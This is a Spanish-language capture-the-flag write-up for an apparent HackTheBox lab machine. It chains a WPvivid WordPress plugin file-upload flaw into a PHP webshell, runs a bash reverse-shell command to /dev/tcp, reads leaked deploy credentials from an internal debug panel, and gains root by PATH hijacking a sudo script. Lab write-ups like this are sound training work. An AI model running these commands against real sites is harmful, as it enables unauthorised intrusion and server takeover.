# Machine
Future Machine On HTB

# Write-up — "CorpPanel" (Easy)

**Vulnerabilidad base:** CVE-2026-1357 — WPvivid Backup & Migration (WordPress) ≤ 0.9.123
Unauthenticated Arbitrary File Upload → RCE (CVSS 9.8)
**OS:** Ubuntu Server 22.04 LTS
**Dificultad:** Easy
**Servicios expuestos:** 22 (SSH), 80 (HTTP / WordPress)
**Servicio interno (no expuesto):** 8081 (panel de monitoreo, sólo 127.0.0.1)

---

## 1. Reconocimiento

```bash
nmap -sC -sV -p- -oN nmap.txt 10.10.10.X
```

Resultado esperado:

```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.x ((Ubuntu))
```

Al visitar `http://10.10.10.X/` se encuentra un sitio WordPress ("Corp Intranet").

```bash
whatweb http://10.10.10.X
wpscan --url http://10.10.10.X --enumerate p
```

`wpscan` (o una enumeración manual de `/wp-content/plugins/`) revela el plugin
**WPvivid Backup & Migration**, y su `readme.txt` expone la versión instalada:

```bash
curl -s http://10.10.10.X/wp-content/plugins/wpvivid-backuprestore/readme.txt | grep -i "stable tag"
# Stable tag: 0.9.123
```

Versión **≤ 0.9.123** → vulnerable a **CVE-2026-1357**.

---

## 2. Análisis de la vulnerabilidad

El plugin implementa una función de "Remote Backup Transfer" (`wpvivid_action=send_to_site`)
pensada para mover backups cifrados entre dos sitios WordPress. El fallo está encadenado en
dos partes (según el análisis público de Wordfence/Ostorlab):

1. **Fail-open criptográfico:** la función `decrypt_message()` llama a
   `openssl_private_decrypt()` para descifrar una clave de sesión AES. Si el descifrado
   falla (por ejemplo, con una clave RSA mal formada), la función **no comprueba el
   valor de retorno** y pasa `false` a `Crypt_Rijndael` de phpseclib v1, que interpreta
   ese `false` como una clave nula de 16 bytes (`\x00 × 16`) en modo CBC con IV nulo.
   Esto significa que **cualquier atacante puede cifrar su propio payload con una clave
   conocida (todo ceros)**, sin necesitar la clave real del servidor.

2. **Path traversal sin sanitizar:** el campo `name` dentro del JSON descifrado se usa
   directamente para escribir el archivo en disco, sin filtrar secuencias `../`. Esto
   permite escapar del directorio de backups restringido y escribir un archivo PHP
   directamente en `wp-content/uploads/`, un directorio público y ejecutable.

**Precondición real:** el atacante necesita que exista una "Key" generada en
`WPvivid → Settings → Auto-Migration` (esto habilita la ruta de código vulnerable;
la clave en sí no protege nada porque el fail-open la vuelve irrelevante).

---

## 3. Explotación (foothold)

```bash
git clone https://github.com/halilkirazkaya/CVE-2026-1357
cd CVE-2026-1357
pip install -r requirements.txt

python3 exploit.py --target http://10.10.10.X --mode shell
```

El exploit:
1. Genera un payload cifrado con AES-128-CBC (clave nula, IV nulo).
2. Lo envía vía `POST /?wpvivid_action=send_to_site` con un `name` que contiene
   `../` para escapar hacia `wp-content/uploads/`.
3. Sube una webshell PHP con un nombre aleatorio.
4. Verifica ejecución remota de comandos:

```bash
curl "http://10.10.10.X/wp-content/uploads/<shell>.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Con esto obtenemos ejecución de comandos como `www-data`. Se puede estabilizar con una
reverse shell:

```bash
curl "http://10.10.10.X/wp-content/uploads/<shell>.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.1/4444+0>%261'"
```

---

## 4. Enumeración post-explotación → Information Leakage

Como `www-data`, se enumeran puertos internos que no son visibles desde fuera:

```bash
www-data@corppanel:~$ ss -tlnp
LISTEN 0 4096 127.0.0.1:8081 ...   php
```

Hay un servicio HTTP interno en `127.0.0.1:8081` no expuesto a la red. Se accede desde
la propia shell:

```bash
www-data@corppanel:~$ curl -s http://127.0.0.1:8081/
```

```
Corp Internal Monitoring
Status: OK

HOSTNAME = corppanel
APP_ENV = internal-staging
DEPLOY_USER = MaureDEV
DEPLOY_SSHPASS = E$toyT3ns0
DB_STATUS = connected
UPTIME = up 2 hours, 14 minutes
```

Este panel interno de monitoreo, dejado en "modo debug", filtra las credenciales de
despliegue en texto plano — un patrón de fuga de información extremadamente común en
entornos reales (dashboards de staging olvidados, `phpinfo()`, Symfony profiler,
paneles de Grafana/Netdata sin autenticar, etc.).

**Credenciales obtenidas:** `MaureDEV : E$toyT3ns0`

---

## 5. Movimiento lateral → usuario

```bash
ssh MaureDEV@10.10.10.X
# Password: E$toyT3ns0
```

```
MaureDEV@corppanel:~$ cat user.txt
<flag>
```

---

## 6. Escalada de privilegios → root

```bash
MaureDEV@corppanel:~$ sudo -l
Matching Defaults entries for MaureDEV on corppanel:
    ...
User MaureDEV may run the following commands on corppanel:
    (root) NOPASSWD: /usr/local/bin/backup-cleanup.sh
```

Se inspecciona el script:

```bash
MaureDEV@corppanel:~$ cat /usr/local/bin/backup-cleanup.sh
#!/bin/bash
echo "[backup-cleanup] Limpiando backups antiguos..."
cd /var/backups/web || exit 1
find . -mtime +7 -exec rm {} \;
tar czf latest.tar.gz *.log 2>/dev/null
echo "[backup-cleanup] Listo."
```

El script llama a `find` y `tar` **sin ruta absoluta**, confiando en la variable
`$PATH` del usuario que lo invoca. Como se ejecuta vía `sudo` conservando el `PATH`
del usuario (configuración por defecto en muchas instalaciones), es posible hacer un
**PATH hijacking** clásico:

```bash
MaureDEV@corppanel:~$ mkdir /tmp/evil
MaureDEV@corppanel:~$ cat <<'EOF' > /tmp/evil/find
#!/bin/bash
chmod +s /bin/bash
EOF
MaureDEV@corppanel:~$ chmod +x /tmp/evil/find
MaureDEV@corppanel:~$ export PATH=/tmp/evil:$PATH
MaureDEV@corppanel:~$ sudo /usr/local/bin/backup-cleanup.sh
MaureDEV@corppanel:~$ /bin/bash -p
bash-5.1# id
uid=1000(MaureDEV) gid=1000(MaureDEV) euid=0(root) groups=1000(MaureDEV)
bash-5.1# cat /root/root.txt
<flag>
```

---

## 7. Resumen de la cadena de ataque

| Fase | Técnica | Resultado |
|---|---|---|
| Recon | nmap + wpscan | Identifica WordPress + plugin WPvivid 0.9.123 |
| Foothold | CVE-2026-1357 (fail-open cripto + path traversal) | RCE como `www-data` |
| Post-explotación | Enumeración de puertos internos (8081) | Panel de debug filtra credenciales |
| Movimiento lateral | SSH con credenciales filtradas | Acceso como `MaureDEV` |
| Privesc | `sudo -l` + PATH hijack sobre `backup-cleanup.sh` | Shell root |
